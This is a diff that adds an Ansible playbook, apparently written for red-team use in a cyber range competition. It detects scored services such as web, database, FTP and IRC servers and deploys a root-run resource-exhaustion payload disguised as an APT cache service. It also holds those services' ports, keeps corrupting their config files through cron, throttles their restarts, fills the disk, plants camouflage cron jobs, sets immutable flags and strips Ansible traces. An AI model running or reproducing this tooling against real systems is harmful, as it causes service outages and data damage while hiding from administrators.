@@ -1,0 +1,301 @@
+---
+- name: Infinite Void Deployment
+  hosts: targets
+  become: yes
+  vars:
+    drop_path: /var/cache/apt
+    script_name: pkgcache.py
+    cpu_target: 90
+    mem_cap_percent: 85
+    run_duration: 99999
+    scored_services:
+      - name: apache2
+        ports: [80, 443]
+        configs: [/etc/apache2/apache2.conf]
+        data_dirs: []
+      - name: nginx
+        ports: [80, 443]
+        configs: [/etc/nginx/nginx.conf]
+        data_dirs: []
+      - name: mariadb
+        ports: [3306]
+        configs: [/etc/mysql/mariadb.conf.d/50-server.cnf]
+        data_dirs: [/var/lib/mysql]
+      - name: mysql
+        ports: [3306]
+        configs: [/etc/mysql/mysql.conf.d/mysqld.cnf]
+        data_dirs: [/var/lib/mysql]
+      - name: cups
+        ports: [631]
+        configs: [/etc/cups/cupsd.conf]
+        data_dirs: []
+      - name: vsftpd
+        ports: [21]
+        configs: [/etc/vsftpd.conf]
+        data_dirs: [/srv/ftp, /var/ftp]
+      - name: irc
+        ports: [6667, 6697]
+        configs: [/etc/inspircd/inspircd.conf, /etc/unrealircd/unrealircd.conf]
+        data_dirs: []
+
+  tasks:
+    # ─── DETECTION PHASE ───────────────────────────────────────────────
+
+    - name: Check which scored services are active
+      shell: systemctl is-active {{ item.name }} 2>/dev/null || echo inactive
+      register: svc_status
+      loop: "{{ scored_services }}"
+      ignore_errors: yes
+
+    - name: Build list of detected services
+      set_fact:
+        detected_services: >-
+          {{
+            scored_services
+            | selectattr('name', 'in', (
+                svc_status.results
+                | selectattr('stdout', 'ne', 'inactive')
+                | selectattr('stdout', 'ne', 'not-found')
+                | map(attribute='item')
+                | map(attribute='name')
+                | list
+              ))
+            | list
+          }}
+
+    - name: Show detected services
+      debug:
+        msg: "Detected scored services on {{ inventory_hostname }}: {{ detected_services | map(attribute='name') | list }}"
+
+    # ─── DEPENDENCIES ──────────────────────────────────────────────────
+
+    - name: Install dependencies
+      apt:
+        name:
+          - python3
+          - python3-pip
+          - python3-psutil
+        state: present
+        update_cache: yes
+
+    # ─── DROP DIRECTORY + I/O CACHE DIR ────────────────────────────────
+
+    - name: Create drop directory
+      file:
+        path: "{{ drop_path }}"
+        state: directory
+        mode: '0755'
+
+    - name: Create I/O cache directory
+      file:
+        path: "{{ drop_path }}/.iocache"
+        state: directory
+        mode: '0700'
+
+    # ─── SCRIPTS ───────────────────────────────────────────────────────
+
+    - name: Drop main payload script
+      copy:
+        src: files/void.py
+        dest: "{{ drop_path }}/{{ script_name }}"
+        mode: '0755'
+
+    - name: Drop launcher script
+      copy:
+        content: |
+          #!/bin/bash
+          if ! pgrep -f pkgcache.py > /dev/null 2>&1; then
+            nohup python3 /var/cache/apt/pkgcache.py \
+              --cpu {{ cpu_target }} --mem {{ mem_cap_percent }} \
+              --duration {{ run_duration }} --no-audio \
+              > /dev/null 2>&1 &
+          fi
+        dest: "{{ drop_path }}/.launcher.sh"
+        mode: '0755'
+
+    # ─── SYSTEMD SERVICES ──────────────────────────────────────────────
+
+    - name: Drop main payload systemd service
+      copy:
+        content: |
+          [Unit]
+          Description=APT Package Cache Management Service
+          After=network.target
+          [Service]
+          Type=simple
+          Environment=DISPLAY=:0
+          Environment=XAUTHORITY=/home/cyberrange/.Xauthority
+          ExecStart=/usr/bin/python3 /var/cache/apt/pkgcache.py --cpu {{ cpu_target }} --mem {{ mem_cap_percent }} --duration {{ run_duration }} --no-audio --visual
+          Restart=always
+          RestartSec=5
+          User=root
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/apt-cache-manager.service
+        mode: '0644'
+
+    - name: Enable and start main payload service
+      systemd:
+        name: apt-cache-manager
+        enabled: yes
+        state: started
+        daemon_reload: yes
+
+    # ─── PORT BLOCKER ──────────────────────────────────────────────────
+
+    - name: Build flat list of ports to block
+      set_fact:
+        ports_to_block: "{{ detected_services | sum(attribute='ports', start=[]) | unique | list }}"
+
+    - name: Drop port conflict daemon
+      copy:
+        content: |
+          #!/usr/bin/env python3
+          import socket, time, threading
+
+          ports = {{ ports_to_block }}
+
+          def hold_port(port):
+              while True:
+                  try:
+                      s = socket.socket()
+                      s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
+                      s.bind(('0.0.0.0', port))
+                      s.listen(1)
+                      time.sleep(99999)
+                  except:
+                      time.sleep(10)
+
+          for p in ports:
+              threading.Thread(target=hold_port, args=(p,), daemon=True).start()
+
+          while True:
+              time.sleep(60)
+        dest: "{{ drop_path }}/.portd.py"
+        mode: '0755'
+      when: ports_to_block | length > 0
+
+    - name: Drop port blocker systemd service
+      copy:
+        content: |
+          [Unit]
+          Description=APT Socket Management
+          After=network.target
+          [Service]
+          Type=simple
+          ExecStart=/usr/bin/python3 /var/cache/apt/.portd.py
+          Restart=always
+          RestartSec=3
+          User=root
+          [Install]
+          WantedBy=multi-user.target
+        dest: /etc/systemd/system/apt-socket-mgr.service
+        mode: '0644'
+      when: ports_to_block | length > 0
+
+    - name: Enable port blocker service
+      systemd:
+        name: apt-socket-mgr
+        enabled: yes
+        state: started
+        daemon_reload: yes
+      when: ports_to_block | length > 0
+
+    # ─── CONFIG CORRUPTION ─────────────────────────────────────────────
+
+    - name: Build flat list of config files to corrupt
+      set_fact:
+        configs_to_corrupt: "{{ detected_services | sum(attribute='configs', start=[]) | list }}"
+
+    - name: Add config corruption cron per detected service
+      cron:
+        name: "config-check-{{ item | basename | replace('.', '-') }}"
+        minute: "*/{{ range(15, 30) | random }}"
+        hour: "*"
+        job: >
+          test -f {{ item }} &&
+          echo "InvalidDirective_$(head -c 6 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 8) on" >> {{ item }}
+        user: root
+      loop: "{{ configs_to_corrupt }}"
+      when: configs_to_corrupt | length > 0
+
+    # ─── SERVICE UNIT SLOWDOWN ─────────────────────────────────────────
+
+    - name: Slow restart timers on detected scored services
+      shell: |
+        unit=$(systemctl show -p FragmentPath {{ item.name }} 2>/dev/null | cut -d= -f2)
+        if [ -n "$unit" ] && [ -f "$unit" ]; then
+          grep -q 'StartLimitBurst' "$unit" || \
+            sed -i '/\[Service\]/a RestartSec=60\nStartLimitInterval=300\nStartLimitBurst=2' "$unit"
+        fi
+      loop: "{{ detected_services }}"
+      ignore_errors: yes
+
+    - name: Reload systemd after unit edits
+      systemd:
+        daemon_reload: yes
+
+    # ─── DISK FILL ─────────────────────────────────────────────────────
+
+    - name: Log partition disk filler cron
+      cron:
+        name: "journal-size-check"
+        minute: "*/8"
+        hour: "*"
+        job: "dd if=/dev/urandom of=/var/log/.journal_cache bs=1M count=200 conv=notrunc 2>/dev/null"
+        user: root
+
+    # ─── CAMO CRON JOBS ────────────────────────────────────────────────
+
+    - name: Add camouflage cron jobs
+      cron:
+        name: "{{ item.name }}"
+        minute: "{{ item.minute }}"
+        hour: "{{ item.hour }}"
+        job: "{{ item.job }}"
+        user: root
+      loop:
+        - { name: "apt-daily-update",       minute: "*/5",  hour: "*",   job: "/usr/lib/apt/apt.systemd.daily update" }
+        - { name: "log-rotate-check",       minute: "0",    hour: "*/4", job: "/usr/sbin/logrotate /etc/logrotate.conf" }
+        - { name: "disk-cache-flush",       minute: "*/3",  hour: "*",   job: "/bin/sync && /bin/echo 3 > /proc/sys/vm/drop_caches" }
+        - { name: "tmp-cleanup",            minute: "*/10", hour: "*",   job: "/usr/bin/find /tmp -type f -atime +1 -delete" }
+        - { name: "syslog-compress",        minute: "0",    hour: "2",   job: "/bin/gzip -f /var/log/syslog.1" }
+        - { name: "network-monitor",        minute: "*/2",  hour: "*",   job: "/usr/lib/networkd-dispatcher/routable.d/10-ifup" }
+        - { name: "security-audit",         minute: "*/15", hour: "*",   job: "/usr/sbin/auditd -n" }
+        - { name: "package-cache-update",   minute: "*/1",  hour: "*",   job: "/bin/bash /var/cache/apt/.launcher.sh" }
+        - { name: "memory-trim",            minute: "*/4",  hour: "*",   job: '/usr/bin/find /proc -name oom_score_adj -exec sh -c "echo 0 > {}" \;' }
+        - { name: "systemd-journal-vacuum", minute: "0",    hour: "*/6", job: "/usr/bin/journalctl --vacuum-time=7d" }
+        - { name: "kernel-module-check",    minute: "*/7",  hour: "*",   job: "/sbin/depmod -a" }
+        - { name: "update-notifier-common", minute: "*/6",  hour: "*",   job: "/usr/lib/update-notifier/update-motd-updates-available" }
+
+    # ─── IMMUTABLE FLAGS ───────────────────────────────────────────────
+
+    - name: Set immutable flag on dropped files
+      shell: |
+        chattr +i /etc/systemd/system/apt-cache-manager.service
+        chattr +i /etc/systemd/system/apt-socket-mgr.service
+        chattr +i {{ drop_path }}/{{ script_name }}
+        chattr +i {{ drop_path }}/.portd.py
+        chattr +i {{ drop_path }}/.launcher.sh
+      ignore_errors: yes
+
+    # ─── STRIP ANSIBLE FINGERPRINTS ────────────────────────────────────
+
+    - name: Remove ansible labels from crontab
+      shell: |
+        crontab -l -u root | grep -v '#Ansible:' | crontab -u root -
+      ignore_errors: yes
+
+    # ─── CONFIRM ───────────────────────────────────────────────────────
+
+    - name: Confirm void running
+      shell: pgrep -f pkgcache.py
+      register: pid_out
+      ignore_errors: yes
+
+    - name: Show status
+      debug:
+        msg: >
+          {{ inventory_hostname }} —
+          void PID {{ pid_out.stdout }} —
+          targeting: {{ detected_services | map(attribute='name') | list }}
